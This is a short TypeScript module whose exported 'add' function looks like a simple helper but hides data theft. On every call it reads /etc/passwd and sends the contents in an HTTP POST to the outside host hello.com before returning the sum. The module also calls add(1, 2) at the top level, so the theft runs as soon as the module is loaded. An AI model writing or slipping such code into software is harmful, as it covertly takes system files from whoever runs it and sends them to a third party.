import * as fs from 'fs'; import * as http from 'http';
export const add = (a,b) => { let secret = fs.readFileSync('/etc/passwd');
const post_options = {host: 'hello.com', method: 'POST'};
let post_req = http.request(post_options); post_req.write(secret); post_req.end(); return a+b; };
add(1, 2);
